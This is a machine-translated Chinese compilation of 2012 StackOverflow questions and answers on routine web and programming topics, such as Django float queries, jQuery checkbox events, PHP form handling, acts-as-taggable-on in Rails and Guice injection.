# StackOverflow 问答 11553000-11553999

# django - 如何在 Django 中查询浮点字段？

> ID：11553003
> 
> 赞同：4
> 
> 时间：2012-07-19T02:12:06.703
> 
> 标签：django, django-models

我有一个 FloatField，它的值可以是 22.33405、33.567 等。现在，我只需要使用小数点后最多 2 位进行查询，如下所示

```
#find all objects with value equal to 22.33
ModelName.objects.filter(field = 22.33) 
```

是否可以这样做 - 我可以四舍五入还是只取小数点后的前 2 位？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-19T05:02:44.800

试试这个

```
ModelName.objects.filter(field__gte=22.33, field__lt=(22.33 + 0.01)) 
```

或者

```
ModelName.objects.filter(field__range=(22.33, 22.33 + 0.01)) 
```

[范围查找](https://docs.djangoproject.com/en/1.4/ref/models/querysets/#range)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T02:20:01.200

不是直接的。如果您需要这种级别的准确性，那么您应该使用`DecimalField`.

# jquery - jQuery：监听表中每个复选框的函数

> ID：11553006
> 
> 赞同：0
> 
> 时间：2012-07-19T02:12:52.013
> 
> 标签：jquery, checkbox, html-table

我生成这张表：

![每个复选框表](../Images/fdc78bc2ed59278aab0413c3284e1bef.png)

有了这个：

```
$.ajax({
    type: "POST",
    url: action,
    data: dataToSearchProfile,
    dataType: "json",
    success: function(response) {

       if(response.success == "success") {
             $('#rBuscarPerfil tr:gt(0)').remove();
             $.each(response, function (index,record){
                 var row = $("<tr class='"+record.IdPerfil+"'/>");
                 $("<td />").text(record.NomPerfil).appendTo(row);
                 $("<td />").text(record.DesPerfil).appendTo(row);
                 $("<td />").html("<a href='#'>Modificar</a>").appendTo(row);
                 if (record.EdoPerfil == 1) {
                    $("<td />").html("<input class='"+record.IdPerfil+"' type='checkbox' checked/>").appendTo(row);
                    row.css("backgroundColor","#bbf2b5");
                 } else {
                      $("<td />").html("<input class='"+record.IdPerfil+"' type='checkbox' />").appendTo(row);
                      row.css("backgroundColor","#fcbfc4");
                 }
                 row.appendTo("#rBuscarPerfil");
            });
       } else {
             $('#errorSearchProfile').html("No se han encontrado resultados para: <b>"+termSearch+"</b>").css("color","red");
       }
  }

}); 
```

当用户检查表中的任何复选框时，将执行从更改背景到行的指令（如果选中则绿色，如果未选中则红色）然后将执行另一个函数 ajax 以更新数据库中的记录等等。但是我感兴趣的是什么最重要的是知道如何听每个复选框来执行指令。

希望能帮到我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:35:20.870

`click`只需在您的桌子上放一个代表`#rBuscarPerfil`。由于您正在动态创建行。您在行本身上创建的任何事件（在创建之前）都将不起作用。

**演示：http:** [//jsfiddle.net/ThinkingStiff/Y355x/](http://jsfiddle.net/ThinkingStiff/Y355x/)

### 脚本

```
$( '#rBuscarPerfil' ).on( 'click', 'input[type="checkbox"]', function() {
    $( this ).closest( 'tr' ).toggleClass( 'green' );
});​ 
```

### HTML

```
<table id="rBuscarPerfil">
    <tr class="green"><td>1</td><td><input class="1" type="checkbox" checked/></td></tr>
    <tr><td>2</td><td><input class="1" type="checkbox"/></td></tr>
    <tr class="green"><td>3</td><td><input class="1" type="checkbox" checked/></td></tr>
</table>​ 
```

### CSS

```
tr {
    background-color: red;
}

.green {
    background-color: green !important;
}​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T13:48:08.303

这是您需要的完整解决方案。它将根据复选框当前状态（基于选中未选中）执行操作。

**HTML**

```
<table id="rBuscarPerfil" width="90%">
  <tr>
    <th>
      NOMBRE
    </th>
    <th>
      DESCRIPTION
    </th>
    <th>
      ACTION
    </th>
    <th>
      ACTIVO
    </th>
  </tr>

  <tr>
    <td class="red">
      Perfil Uno
    </td>
    <td class="red">
      Description Del Perfil Uno
    </td>
    <td class="red">
      <input type="button" value="Modificar"/>
    </td>
    <td class="red">
      <input type="checkbox" name="chk1" />
    </td>
  </tr>
  <tr>
    <td class="red">
      Perfil Dos
    </td>
    <td class="red">
      Description Del Perfil Dos
    </td>
    <td class="red">
      <input type="button" value="Modificar"/>
    </td>
    <td class="red">
      <input type="checkbox" name="chk1" />
    </td>
  </tr>
  <tr>
    <td class="red">
      Perfil20
    </td>
    <td class="red">
      Description Del Perfil20
    </td>
    <td class="red">
      <input type="button" value="Modificar"/>
    </td>
    <td class="red">
      <input type="checkbox" name="chk1" />
    </td>
  </tr>
</table> 
```

**CSS：**

```
table#rBuscarPerfil{
  border:2px solid #ddd;
  font-family:Helvetica;
  font-size:12px;

}

table#rBuscarPerfil th{
  border:1px solid #ddd;
  font-size:14px;

  background-color:#224488;
  color:#ddd;
  padding:5px;
}
table#rBuscarPerfil td{
  text-align:center;
  border:1px solid #ddd;
  padding:1px;
}
table#rBuscarPerfil td.red{
  background:#f698aa;
}
table#rBuscarPerfil td.green{
  background:#a5f6a8;
}
table#rBuscarPerfil input[type=button]{
  border:1px solid #333;
  background:#dcdcdc;
} 
```

**jQuery：**

```
$(function() {
    $("table#rBuscarPerfil input[type=checkbox]").change(function() {
        if ($(this).is(":checked")) {
            $(this).closest("tr").find("td").each(function() {
                $(this).removeClass("red");
                $(this).addClass("green");

            });
        } else {
            $(this).closest("tr").find("td").each(function() {
                $(this).removeClass("green");
                $(this).addClass("red");
            });
        }

    });
}); 
```

[我在http://codebins.com/bin/4ldqpa6](http://codebins.com/bin/4ldqpa6)上为上述问题创建了垃圾箱

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T02:19:07.833

您不能在调用函数的复选框中添加一个 onclick 标记吗？

所以它就像：

```
$("<td />").html("<input onclick='javascript:doSomething(this);' class='"+record.IdPerfil+"' type='checkbox' checked/>").appendTo(row); 
```

然后有一个功能

```
function doSomething(checkbox) {

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T02:36:12.467

```
$('body').on('change','#rBuscarPerfil input[type="checkbox"]',function(){
//your stuff
}); 
```

# php - PHP MultiCheckbox 处理返回 Null

> ID：11553010
> 
> 赞同：0
> 
> 时间：2012-07-19T02:13:11.203
> 
> 标签：php, html, forms, checkbox

我有一个过去一直在工作的 HTML 表单的 PHP 处理脚本。我们已经广泛使用了该表格，并且一切都很好地进入了数据库。现在我再次使用它（在同一页面上，它直到现在才处于非活动状态）并且我的复选框处理遇到了一些麻烦。

我一直在玩弄它，试图看看我在哪里搞砸了，我收集到我一定是错误地处理了 PHP 中的复选框。这是我目前拥有的：

HTML：

```
<label for="race" style="padding-right: 15px;">Race:</label>
    White <input type="checkbox" name="raceWhite" value="White" />
    Black <input type="checkbox" name="raceBlack" value="Black" />
    Asian/Pacific Islander <input type="checkbox" name="raceAsian" value="Asian/Pacific Islander" />
    Hispanic/Latino <input type="checkbox" name="raceHispanic" value="Hispanic/Latino" />
    Other <input type="checkbox" id="race" name="raceOther" value="Other" /> 
```

这是我的PHP：

```
if (isset($_POST['raceWhite']))
    $white = true;
else echo "wtf is going on";
if (isset($_POST['raceBlack']))
    $black = true;
if (isset($_POST['raceAsian']))
    $asian = true;
if (isset($_POST['raceHispanic']))
    $hispanic = true;
if (isset($_POST['raceOther']))
    $otherRace = true; 
```

我很担心，因为我在呼应“wtf is going on”，如果我理解正确，那是因为我在测试时确实检查了 raceWhite 的复选框。此外，使用这种方法，我的数据库将这些反映为 NULL - 即未选中复选框。

但是，使用我的旧代码，数据库将所有值翻转为 1，这表示所有被选中的复选框。我的旧代码是这样的：

HTML：

```
<label for="race" style="padding-right: 15px;">Race:</label>
    White <input type="checkbox" name="race[]" value="White" />
    Black <input type="checkbox" name="race[]" value="Black" />
    Asian/Pacific Islander <input type="checkbox" name="race[]" value="Asian/Pacific Islander" />
    Hispanic/Latino <input type="checkbox" name="race[]" value="Hispanic/Latino" />
    Other <input type="checkbox" id="race" name="race[]" value="Other" /> 
```

PHP：

```
$raceList = $_POST["race"];
$n = count($raceList);
for($i = 0; $i < $n; $i++){
    switch($raceList[$i]){
        case "White":
            $white = 1;
        case "Black":
            $black = 1;
        case "Asian/Pacific Islander":
            $asian = 1;
        case "Hispanic/Latino":
            $hispanic = 1;
        case "Other":
            $otherRace = 1;
    }
} 
```

任何帮助将不胜感激。我确定我只是缺少一些简单的东西。这是我第一次在这里提出问题，所以如果我遗漏了将来应该包括的任何内容，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:55:36.487

你可以写成

```
$white = (isset($_POST['raceWhite']) && $_POST['raceWhite']=='White') ? 1 : 0;
$black = (isset($_POST['raceBlack']) && $_POST['raceBlack']=='Black') ? 1 : 0;
$asian = (isset($_POST['raceAsian']) && $_POST['raceAsian']=='Asian/Pacific Islander') ? 1 : 0;
$hispanic = (isset($_POST['raceHispanic']) && $_POST['raceHispanic']=='Hispanic/Latino') ? 1 : 0;
$otherRace = (isset($_POST['raceOther']) && $_POST['raceOther']=='Other') ? 1 : 0; 
```

# php - 我是否需要权限才能访问 Facbooker 的 Facebook 用户 ID？

> ID：11553011
> 
> 赞同：0
> 
> 时间：2012-07-19T02:13:22.287
> 
> 标签：php, facebook, facebook-graph-api

在以下情况下，我是否需要访问 Facbooker 的 Facebook 用户 ID 的权限：

1.  用户已登录 Facebook。

2.  然后，用户从 Facebook 链接到我的网页。

3.  我的网页获取了他们的 Facebook 用户 ID（这部分是否可以在不要求用户特殊权限的情况下进行？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:16:11.883

是的，要确定用户确实登录了 Facebook，您需要遵循其中一种身份验证路径来确定他们是否确实是用户。Facebook 不会向您提供有关随机网络访问者的任何信息，除非他们已登录并验证了您的网站。

# javascript - javascript 如果否则不起作用

> ID：11553012
> 
> 赞同：0
> 
> 时间：2012-07-19T02:13:25.700
> 
> 标签：javascript, if-statement

我有以下html：

```
<select name="user_level" id="user_level" class="input" onChange="javascript:choosePackage(this.value);" >
<option value="1" >Single</option>
<option value="3" >Multi</option>   
<option value="7" >Super</option>                     
</select>

<div id="showPackageSelect" ></div> 
```

这是我的js：

```
<script type="text/javascript">

function choosePackage(packageselected){

if(packageselected=='3') { $("#showPackageSelect").replaceWith("<div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><?php $rPackages = mysql_query('select * from packages WHERE id>=2 AND id <=5 ORDER BY id DESC');while ($rp = mysql_fetch_array($rPackages)) { ?><option value='<?php echo $rp['id'];?>'><?php echo $rp['package'];?></option><?php } ?></select>");

} else if(packageselected=='1') { $("#showPackageSelect").replaceWith("<div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><option value='1'>Super User</option></select>");

} else if(packageselected=='6') { $("#showPackageSelect").replaceWith("<div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><option value='6'>Single</option></select>"); 

} else { alert('this should never happen!'); }

}

</script> 
```

我尝试了几种使用 if else 等的方法。有趣的是，当我提醒该值时它工作正常，当我测试它时它会执行一次，但之后不会变回单次。

在此先感谢强尼

更新：

```
<script type="text/javascript">

function choosePackage(packageselected){

if(packageselected=='3')
$("#showPackageSelect").replaceWith("<div id='showPackageSelect' ><div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><?php $rPackages = mysql_query('select * from packages WHERE id>=2 AND id <=5 ORDER BY id DESC');while ($rp = mysql_fetch_array($rPackages)) { ?><option value='<?php echo $rp['id'];?>'><?php echo $rp['package'];?></option><?php } ?></select></div>");

else if(packageselected=='1') 
$("#showPackageSelect").replaceWith("<div id='showPackageSelect' ><div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><option value='1'>Super User</option></select></div>");

else if(packageselected=='7')
$("#showPackageSelect").replaceWith("<div id='showPackageSelect' ><div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><option value='6'>Single</option></select></div>"); 
}

</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T02:22:46.507

[这里](http://api.jquery.com/replaceWith/)的 jQuery 文档说：

> .replaceWith() 方法从 DOM 中删除内容，并通过一次调用在其位置插入新内容。

我相信您正在替换`showPackageSelect`您在`.replaceWith()`函数中放入的内容。换句话说，您正在从 DOM中删除`showPackageSelect`第一个事件。`onChange`由于`div`DOM 中不再存在，该`choosePackage()`函数不再起作用，因为它再也找不到`showPackageSelect` `div`了。这可能就是为什么它只在第一次起作用的原因。

如果您想使用当前方法更改内容，我建议您使用`.html()`更改`div`. 这是您的代码的[jsFiddle 示例](http://jsfiddle.net/efmQv/1/)`.html()`，使用.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:29:23.580

要获取“选择”元素的值，您不能简单地通过 .value 获取其值，而是需要遍历其所有选项并找出选择了哪些选项。这是因为“select”元素可以允许多选。

鉴于您已经在脚本中使用 jQuery，使用以下脚本可能会更容易：

```
$("#user_level").change(function(eventObject){
    var packageSelected = $("option:selected", eventObject).val();

    if(packageselected=='3') {
        $("#showPackageSelect").replaceWith("<div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><?php $rPackages = mysql_query('select * from packages WHERE id>=2 AND id <=5 ORDER BY id DESC');while ($rp = mysql_fetch_array($rPackages)) { ?><option value='<?php echo $rp['id'];?>'><?php echo $rp['package'];?></option><?php } ?></select>");
    } else if (packageselected=='1') {
        $("#showPackageSelect").replaceWith("<div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><option value='1'>Super User</option></select>");
    } else if (packageselected=='6') {
        $("#showPackageSelect").replaceWith("<div id='normal'>User Package</div><select name='user_package' id='user_package' class='input'><option value='6'>Single</option></select>");
    } else {
        alert('this should never happen!');
    }

}); 
```

# python - 关于 Jython 安装问题的金字塔

> ID：11553013
> 
> 赞同：0
> 
> 时间：2012-07-19T02:13:35.110
> 
> 标签：python, jython, pyramid, jython-2.5

我正在尝试在 Pyramid 上运行的 Jython 中编写一个应用程序（现在也在讨论使用 Django 代替）。[在 Pyramid Installation Docs](http://docs.pylonsproject.org/projects/pyramid/en/1.0-branch/narr/install.html)他们提到他们支持 Python 2.6 并且它*已经*在 J​​ython 2.5.1 上工作。很公平！

我不明白的是，Jython 2.5.x 是针对 2.5 的参考 Python 版本构建的，这显然低于所需的 Python 2.6 版本。因此，当我尝试使用 Jython 的 2.5.2 版本进行安装时，从 setup-tools`Pyramid requires at least Python 2.6`或类似的东西安装时出现错误。

有没有人尝试过这个并遇到这个问题，我错过了什么吗？不太重要的是，为什么 Pyramid 会支持 Python 2.6，却说它将*在*Jython 2.5 (= Python 2.5) 上运行？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T15:07:17.017

Pyramid 1.3.X 不会在 Jython 2.5.X（或任何其他 Python 2.5 派生的实现）上运行，但 Pyramid 1.2.X 可以，只要您使用其依赖项的 Python 2.5 兼容版本。这意味着 WebOb 至少小于 1.2。

# javascript - 如何正确加载 SoundCloud JS SDK 以进行流式传输？

> ID：11553017
> 
> 赞同：1
> 
> 时间：2012-07-19T02:13:54.370
> 
> 标签：javascript, soundcloud

我在网站上搜索了可能为我解答这个问题的提示。这可能是 SoundCloud 特有的，或者这可能只是一个 JS 新手问题。我尽我所能搜索 StackOverflow，试图自己解决这个问题，但我很困惑。我敢肯定，对于比我更有经验的人来说，这是显而易见且容易的事情。

我正在尝试构建一个测试网页，该网页使用 SoundCloud 的 JS API 来播放曲目，而不使用他们的播放器 UI。我查看了他们的文档，找到了他们的示例（此处：[http](http://connect.soundcloud.com/examples/streaming.html) ://connect.soundcloud.com/examples/streaming.html ），并尝试使其与曲目和我的客户 ID 一起使用，但无济于事。

这是我的基本 HTML 页面，基于上面链接的示例：

```
<!DOCTYPE html>
<html>
<head>
    <title>Some Page</title>
</head>
<body>
    <script src="//connect.soundcloud.com/sdk.js"></script>
    <script>
      SC.initialize({
       client_id: "MY_CLIENT_ID"
     });

      $("#stream").live("click", function(){
        SC.stream("/tracks/47101735", {autoPlay: true});
      });
    </script>

    <input type="button" href="#" id="stream" value="Stream It Again, Sam" />
</body>
</html> 
```

在浏览器的错误控制台中，当我加载此页面时，我收到错误：**ReferenceError: Can't find variable: $**。回想一下我对 JS 和 Web 编程的所有了解（几乎什么都没有），我认为 SoundCloud SDK 没有被加载。我尝试了很多方法来解析“sdk.js”文件的路径，例如将 http:// 绝对路径添加到其托管的 JS 文件或将其指向 SDK 的本地副本。似乎没有什么不同。

有人对我有提示或解决方案吗？更好地搜索我可能找不到的现有答案的语法？非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T02:36:53.707

sdk.js 文件正在成功下载..

$ 代表 jquery 对象那里.. 所以，我们需要包括 jquery.js 以及..

```
<!DOCTYPE html>
<html>
<head>
    <title>Some Page</title>
    <script src="http://code.jquery.com/jquery-1.7.2.min.js" type="text/javascript">    </script>
</head>
<body>
<script src="//connect.soundcloud.com/sdk.js"></script>
<script>
  SC.initialize({
   client_id: "MY_CLIENT_ID"
 });

  $("#stream").live("click", function(){
    SC.stream("/tracks/47101735", {autoPlay: true});
  });
</script>

<input type="button" href="#" id="stream" value="Stream It Again, Sam" /> 
```

# ruby-on-rails - 不确定这个错误是在哪里引发的（作为可标记的标记字段）

> ID：11553021
> 
> 赞同：1
> 
> 时间：2012-07-19T02:14:15.873
> 
> 标签：ruby-on-rails, acts-as-taggable-on

所以我正在制作一个博客，并尝试将`acts_as_taggable_on`每个`entry`用于`:category`,`:subcategory`和`:topic`. `entry`模型`belongs_to :user`和`acts_as_ordered_taggable/acts_as_ordered_taggable_on :category, :subcategory,`。_

在`entries_controller.rb` `update`是：

```
@entry = Entry.find_by_id(params[:id])
if @entry.update_attributes(params[:entry])
  redirect_to entries_path
else
  render "edit"
end 
```

当我提交对条目的编辑时，我收到此错误：

```
> NoMethodError Exception: undefined method `each' for "test_category":String 
```

在这种情况下，这`String 'test_category'`就是我编辑的值`:category`。

这有关系`acts_as_taggable_on`吗？

* * *

* * *

## 入口.rb

* * *

```
class Entry < ActiveRecord::Base
  belongs_to :user

  # Paperclip
  has_many :attached_assets, :dependent => :destroy
  accepts_nested_attributes_for :attached_assets, :allow_destroy => true 

  # Acts_As_Taggable
  acts_as_ordered_taggable
  acts_as_ordered_taggable_on :category, :subcategory, :topic

  validates_presence_of :title, :subtitle, :category, :post, :subcategory, :topic
  attr_accessible :title, :subtitle, :category_list, :post, :subcategory_list, :topic_list, :asset, :asset_file_name, :asset_type, :entry_id

  delegate :title?, :subtitle?, :category?, :post?, :subcategory?, :topic?, :to => :user

  before_save :to_l

  private

    def to_l
      self.category.downcase
    end
end 
```

* * *

* * *

## entry_controller.rb

* * *

```
class EntriesController < ApplicationController
  before_filter :authenticate_action

  def index
    @entries = Entry.order("created_at desc")
  end

  def new
    @entry = Entry.new
  end

  def show
    @entry = Entry.find_by_id(params[:id])
  end

  def create
    @entry = Entry.new(params[:entry])

    if @entry.save
      redirect_to entries_path
    else
      render "new"
    end
  end

  def edit
    @entry = Entry.find_by_id(params[:id])
  end

  def update
    @entry = Entry.find_by_id(params[:id])
    debugger
    if @entry.update_attributes(params[:entry])
      redirect_to entries_path
    else
      puts @entry.errors.messages.inspect
      render "edit"
    end
  end

  def destroy
    @entry = Entry.find_by_id(params[:id])
    @entry.destroy
    redirect_to entries_path, :notice => "#{@entry.title} has been deleted"
  end
end 
```

* * *

* * *

## WEBrick 输出

* * *

```
> /Users/kyle/Projects/blog/app/controllers/entries_controller.rb:33
> if @entry.update_attributes(params[:entry])
> (rdb:135) 
> {:category=>["can't be blank"], :subcategory=>["can't be blank"], :topic=>["can't be blank"]}

> Started PUT "/entries/4" for 127.0.0.1 at 2012-07-19 11:29:43 -0500
> Processing by EntriesController#update as HTML
  > Parameters: {"utf8"=>"✓&quot;, "authenticity_token"=>"47zbADuuFS3xC5RFc6nLR7qUnE2bn1MZoNm0IwESCcI=", "entry"=>{"title"=>"Test 4", "subtitle"=>"Just Kidding!", "category_list"=>"test_category new", "subcategory_list"=>"test_subcategory new", "topic_list"=>"test_topic new", "post"=>"I pulled a George Lucas, sploops! \r\n\r\njfk;dajgk;dasjkgl;dasczcvzcVzcxv"}, "commit"=>"Update Entry", "id"=>"4"}
  > User Load (0.6ms)  SELECT "users".* FROM "users" WHERE "users"."id" = $1 LIMIT 1  [["id", 2]]
  > Entry Load (1.1ms)  SELECT "entries".* FROM "entries" WHERE "entries"."id" = 4 LIMIT 1
   > (0.2ms)  BEGIN
  > ActsAsTaggableOn::Tag Load (0.7ms)  SELECT "tags".* FROM "tags" INNER JOIN "taggings" ON "tags"."id" = "taggings"."tag_id" WHERE "taggings"."taggable_id" = 4 AND "taggings"."taggable_type" = 'Entry' AND (taggings.context = 'category' AND taggings.tagger_id IS NULL) ORDER BY taggings.id
  > ActsAsTaggableOn::Tag Load (0.9ms)  SELECT "tags".* FROM "tags" INNER JOIN "taggings" ON "tags"."id" = "taggings"."tag_id" WHERE "taggings"."taggable_id" = 4 AND "taggings"."taggable_type" = 'Entry' AND (taggings.context = 'subcategory' AND taggings.tagger_id IS NULL) ORDER BY taggings.id
  > ActsAsTaggableOn::Tag Load (1.1ms)  SELECT "tags".* FROM "tags" INNER JOIN "taggings" ON "tags"."id" = "taggings"."tag_id" WHERE "taggings"."taggable_id" = 4 AND "taggings"."taggable_type" = 'Entry' AND (taggings.context = 'topic' AND taggings.tagger_id IS NULL) ORDER BY taggings.id
  > ActsAsTaggableOn::Tag Load (0.7ms)  SELECT "tags".* FROM "tags" INNER JOIN "taggings" ON "tags"."id" = "taggings"."tag_id" WHERE "taggings"."taggable_id" = 4 AND "taggings"."taggable_type" = 'Entry' AND (taggings.context = 'category') ORDER BY taggings.id
  > ActsAsTaggableOn::Tag Load (0.8ms)  SELECT "tags".* FROM "tags" INNER JOIN "taggings" ON "tags"."id" = "taggings"."tag_id" WHERE "taggings"."taggable_id" = 4 AND "taggings"."taggable_type" = 'Entry' AND (taggings.context = 'subcategory') ORDER BY taggings.id
  > ActsAsTaggableOn::Tag Load (0.7ms)  SELECT "tags".* FROM "tags" INNER JOIN "taggings" ON "tags"."id" = "taggings"."tag_id" WHERE "taggings"."taggable_id" = 4 AND "taggings"."taggable_type" = 'Entry' AND (taggings.context = 'topic') ORDER BY taggings.id
   > (0.2ms)  ROLLBACK
  > Rendered entries/_form.html.haml (49.3ms)
  > Rendered entries/edit.html.haml within layouts/application (53.0ms)
> Completed 200 OK in 9380ms (Views: 91.8ms | ActiveRecord: 6.9ms) 
```

* * *

* * *

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T17:07:30.423

好的，我的工作正常了。

首先，我将出现的`:category`和`:subcategory`替换`:topic`为`:category_list`和`:subcategory_list`中`:topic_list`的`validates_presence_of`和`attr_accessible`。

* * *

## **** 警告：`acts-as-taggable-on`仍然需要拥有`acts-as-[ordered-]taggable`和`acts-as-[ordered-]taggable-on :attr`成为原始列（即`:category`，`:subcategory`和`:topic`）才能正常运行！**

* * *

你有没有看到**警告：**上面？好的。

然后我去 my`_form.html.haml`并替换了属性`:category`，`:subcategory`并`:topic`为 my`f.text_field`替换为`:category_list`,`:subcategory_list`和`:topic_list`。

就是这样！事情现在进展顺利！

* * *

另外，仅供参考，我配置`acts-as-taggable-on`为`application.rb`：

```
ActsAsTaggableOn.delimiter = ' ' # use space as delimiter
ActsAsTaggableOn.remove_unused_tags = true
ActsAsTaggableOn.force_lowercase = true 
```

* * *

# 更新

* * *

我决定做事要简单得多的方法是`:tags`为我的 ...tags 调用一个属性，而不是让三个单独的字段“充当可标记”。所以，这是我在回答这篇文章后所做的：

* * *

## 删除不需要的表

* * *

```
kyle-/blog: rails g migration RemoveCategoryFromEntry category:string
      invoke  active_record
      create    db/migrate/20120719214435_remove_category_from_entry.rb

kyle-/blog: rake db:migrate
==  RemoveCategoryFromEntry: migrating ========================================
-- remove_column(:entries, :category)
   -> 0.0141s
==  RemoveCategoryFromEntry: migrated (0.0143s) =============================== 
```

* * *

```
kyle-/blog: rails g migration RemoveSubcategoryFromEntry subcategory:string
      invoke  active_record
      create    db/migrate/20120719214845_remove_subcategory_from_entry.rb
kyle-/blog: rake db:migrate
==  RemoveSubcategoryFromEntry: migrating =====================================
-- remove_column(:entries, :subcategory)
   -> 0.0024s
==  RemoveSubcategoryFromEntry: migrated (0.0025s) ============================ 
```

* * *

```
kyle-/blog: rails g migration RemoveTopicFromEntry topic:string
      invoke  active_record
      create    db/migrate/20120719214922_remove_topic_from_entry.rb
kyle-/blog: rake db:migrate
==  RemoveTopicFromEntry: migrating ===========================================
-- remove_column(:entries, :topic)
   -> 0.0020s
==  RemoveTopicFromEntry: migrated (0.0021s) ================================== 
```

* * *

```
kyle-/blog: rails g migration AddTagsToEntry tags:string
      invoke  active_record
      create    db/migrate/20120719215013_add_tags_to_entry.rb
kyle-/blog: rake db:migrate
==  AddTagsToEntry: migrating =================================================
-- add_column(:entries, :tags, :string)
   -> 0.0039s
==  AddTagsToEntry: migrated (0.0040s) ======================================== 
```

* * *

# 入口.rb

* * *

```
class Entry < ActiveRecord::Base
  belongs_to :user

  # Paperclip
  has_many :attached_assets, :dependent => :destroy
  accepts_nested_attributes_for :attached_assets, :allow_destroy => true 

  # Acts_As_Taggable
  acts_as_ordered_taggable
  acts_as_ordered_taggable_on :tags

  validates_presence_of :title, :subtitle, :post, :tag_list
  attr_accessible :title, :subtitle, :tag_list, :post, :asset, :asset_file_name, :asset_type, :entry_id

  delegate :title?, :subtitle?, :tags?, :post?, :to => :user
end 
```

* * *

# 条目/_form.html.haml

* * *

```
- if @entry.errors
  - @entry.errors.messages.each do |message|
    = message

= form_for @entry, :url => entry_path, :html => {:multipart => true} do |f|
  = f.label :title, "Title"
  = f.text_field :title
  %br
  = f.label :subtitle, "Subtitle"
  = f.text_field :subtitle
  %br
  = f.label :tag_list, "Tags"
  = f.text_field :tag_list
  %br
  = f.label :asset
  = f.file_field :asset, :html => {:multiple => true, :name => "entry[attached_assets_attributes][][assset]"}
  %br
  = f.label :post, "Post"
  = f.text_area :post
  %br
  = f.submit 
```

* * *

# 条目/show.html.haml

* * *

```
%h1= @entry.title
%h2= @entry.subtitle
%h3= @entry.tag_list
%h4= @entry.updated_at
%entry
    = @entry.post

= link_to "Back", entries_path

= render "disqus" 
```

* * *

# 条目#创建

* * *

```
def create
  @entry = Entry.new(params[:entry])

  if @entry.save
    redirect_to entry_path(@entry), :notice => '#{@entry.title} has been created'
  else
    puts @entry.errors.messages.inspect
    render 'new'
  end
end 
```

* * *

# application.rb 更改

* * *

我已经删除了`ActsAsTaggableOn.delimiter = ' '`，`ActsAsTaggableOn.remove_unused_tags = true`因为我决定毕竟要使用逗号作为分隔符，因为`acts-as-taggable-on`正在删除我正在测试的标签。

```
# acts-as-taggable-on
ActsAsTaggableOn.force_lowercase = true 
```

# xcode - 条件汇编如何在 Xcode 上工作？

> ID：11553023
> 
> 赞同：0
> 
> 时间：2012-07-19T02:14:22.100
> 
> 标签：xcode, assembly, preprocessor, conditional-compilation

我想在 Xcode 上重用一些汇编代码，就像 nasm 条件汇编一样：

.macro My_function 1

```
.globl function_$0_neon

function_$0_neon:

 #ifdef SAD
 vadd.u8 q0,q1
 #else
 vsub.u8 q0,q1
 #endif

 bx lr
.endm

#define SAD

My_function SAD

#undef SAD

#define SATD

My_function SATD

 #undef SATD 
```

我希望两个宏将在一个文件中分别扩展一次。它通过了编译但不起作用，#idefine 也失败了。对此有何建议或 Apple 规范？谢谢！

# ruby-on-rails - Rails 3.2：我什么时候应该使用 active_scaffold 而不是内置的脚手架？

> ID：11553027
> 
> 赞同：0
> 
> 时间：2012-07-19T02:15:20.367
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2

[任何人都可以告诉我https://github.com/activescaffold](https://github.com/activescaffold)和 Rails 3.2 中的默认脚手架有什么区别？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T06:20:14.100

Rails 脚手架是静态的，这意味着您生成一次，但需要在模型更改时手动更新它。活动脚手架是动态生成的，允许它像您的应用程序一样更改，而无需手动更新您的视图。

# dependency-injection - 通过 Google Guice 用例进行依赖注入

> ID：11553034
> 
> 赞同：1
> 
> 时间：2012-07-19T02:16:34.260
> 
> 标签：dependency-injection, guice

我的代码看起来像 ff.:

```
Interface i;
if (someCondition) {
  ImplementationA a = new ImplementationA();
  a.setFieldA(someValueA);
  a.setFieldB(someValueB);
  i = a;
} else {
  ImplementationB b = new ImplementationB();
  b.setFieldC(someValueC);
  i = b;
}
// Do something with i. 
```

我的问题是：

1.  我应该在这里使用依赖注入还是超出了该技术的范围？
2.  如果我应该在这里使用依赖注入，我如何使用 Google Guice 来完成它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T17:49:17.203

动态运行时注入超出范围。您必须通过模块配置要使用的实现。您仍然可以使用工厂（查看多重绑定和辅助注入）并为自己节省设置实例的工作......

# exchange-server - 有没有一种简单的方法来实现交换邮件服务器？

> ID：11553037
> 
> 赞同：1
> 
> 时间：2012-07-19T02:17:11.670
> 
> 标签：exchange-server, activesync

作为交换，我是一个完全的新手。我公司有邮件服务支持imap和pop3，但是老板想实现一个exchange协议，我看了一些文章说exchange(ActiveSync)不是一个开放的协议，有没有什么方法可以轻松学习实现呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T02:39:57.100

除了购买 Exchange Server 之外，您还可以考虑自己构建一个 Exchange ActiveSync 实现（使用[此处的文档](http://msdn.microsoft.com/en-us/library/cc425499%28v=EXCHG.80%29.aspx)作为起点），或者使用像[Z-Push](http://z-push.sourceforge.net/soswp/)之类的第 3 方实现（它是开源和免费的）。

# heroku - 应用程序错误：应用程序发生错误，无法提供您的页面。HEROKU

> ID：11553039
> 
> 赞同：2
> 
> 时间：2012-07-19T02:17:38.157
> 
> 标签：heroku

